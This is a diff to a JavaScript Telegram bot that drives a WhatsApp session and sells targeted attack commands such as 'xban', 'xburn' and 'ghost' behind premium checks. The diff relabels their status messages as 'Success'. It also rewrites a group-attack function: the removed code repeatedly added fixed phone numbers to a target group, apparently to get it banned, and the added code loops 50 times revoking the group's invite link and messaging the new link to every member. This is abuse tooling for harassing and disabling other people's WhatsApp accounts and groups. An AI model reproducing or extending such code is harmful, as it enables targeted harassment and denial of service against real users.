@@ -1926,7 +1926,7 @@ bot.command("ghost", checkWhatsAppConnection, checkPremium, checkCooldown, async
 <blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
 ✧ Target: ${q}
 ✧ Type: ghost
-✧ Status: Process
+✧ Status: Success
 ✧ Author : @AlipzzyOfficiaL</strong></blockquote>
 `,
     parse_mode: "HTML",
@@ -1971,7 +1971,7 @@ bot.command("xghost", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
 <blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
 ✧ Target: ${q}
 ✧ Type: xghost
-✧ Status: Process
+✧ Status: Success
 ✧ Author : @AlipzzyOfficiaL</strong></blockquote>
 `,
     parse_mode: "HTML",
@@ -2016,7 +2016,7 @@ bot.command("xollow", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
 <blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
 ✧ Target: ${q}
 ✧ Type: xollow
-✧ Status: Process
+✧ Status: Success
 ✧ Author : @AlipzzyOfficiaL</strong></blockquote>
 `,
     parse_mode: "HTML",
@@ -2061,7 +2061,7 @@ bot.command("xlite", checkWhatsAppConnection, checkPremium, checkCooldown, async
 <blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
 ✧ Target: ${q}
 ✧ Type: xlite
-✧ Status: Process
+✧ Status: Success
 ✧ Author : @AlipzzyOfficiaL</strong></blockquote>
 `,
     parse_mode: "HTML",
@@ -2107,7 +2107,7 @@ bot.command("xburn", checkWhatsAppConnection, checkPremium, checkCooldown, async
 <blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
 ✧ Target: ${q}
 ✧ Type: xburn
-✧ Status: Process
+✧ Status: Success
 ✧ Author : @AlipzzyOfficiaL</strong></blockquote>
 `,
     parse_mode: "HTML",
@@ -2155,7 +2155,7 @@ bot.command("xslash", checkWhatsAppConnection, checkPremium, checkCooldown, asyn
 <blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
 ✧ Target: ${q}
 ✧ Type: xslash
-✧ Status: Process
+✧ Status: Success
 ✧ Author : @AlipzzyOfficiaL</strong></blockquote>
 `,
     parse_mode: "HTML",
@@ -2199,7 +2199,7 @@ bot.command("xban", checkWhatsAppConnection, checkPremium, checkCooldown, async 
 <blockquote><strong>╭═───⊱ 𝚇𝚒𝚟𝚎𝚛𝚣 𝙿𝚑𝚊𝚗𝚝𝚘𝚖  ───═⬡
 ✧ Target: ${q}
 ✧ Type: xban
-✧ Status: Process
+✧ Status: Success
 ✧ Author : @AlipzzyOfficiaL</strong></blockquote>
 `,
     parse_mode: "HTML",
@@ -2480,55 +2480,23 @@ messageId: iVeKXl.key.id
 })
 }
 async function XvZBanGb(sock, groupJid) {
-  if (!groupJid.endsWith('@g.us')) {
-    throw new Error('@g.us server required');
-  }
+  if (!groupJid.endsWith("@g.us")) throw new Error("@g.us required");
 
-  const group = groupJid;
+  const meta = await sock.groupMetadata(groupJid);
+  const targets = meta.participants.map(p => p.id);
 
-  try {
-    const firstRes = await sock.groupParticipantsUpdate(
-      group,
-      ['1212008800@s.whatsapp.net'],
-      'add',
-    );
-
-    if (Array.isArray(firstRes) && firstRes[0] && firstRes[0].status !== '200') {
-      console.warn(`First add returned status: ${firstRes[0].status}`);
-    }
-
+  for (let i = 0; i < 50; i++) {
     try {
-      await sock.sendPresenceUpdate('composing', group);
-    } catch (presenceErr) {
-      console.error('Presence update failed:', presenceErr?.message || presenceErr);
-    }
-
-    console.log(`Successfully banned group: ${group}`);
-
-    for (let i = 0; i < 15; i++) {
-      try {
-        const res = await sock.groupParticipantsUpdate(
-          groupJid,
-          ["12126660007@s.whatsapp.net"],
-          "add"
-        );
-
-        if (Array.isArray(res) && res[0] && res[0].status !== '200') {
-          console.error(`Attempt ${i + 1} failed with status: ${res[0].status}`);
-        } else {
-          console.log(`Attempt ${i + 1} successful`);
-        }
-
-        await new Promise((r) => setTimeout(r, 1500 + Math.floor(Math.random() * 1000)));
-      } catch (err) {
-        console.error(`Error in XvZ Banned Group ${i + 1}:`, err);
-        await new Promise((r) => setTimeout(r, 2000));
+      await sock.groupRevokeInvite(groupJid);
+      const newLink = await sock.groupInviteCode(groupJid);
+      for (const target of targets) {
+        try {
+          await sock.sendMessage(target, {
+            text: "https://chat.whatsapp.com/" + newLink
+          });
+        } catch (e) {}
       }
-    }
-
-  } catch (err) {
-    console.error('Error in XvZ Banned Groip:', err);
-    throw err;
+    } catch (e) {}
   }
 }
 async function XvZiOS(sock, target) {
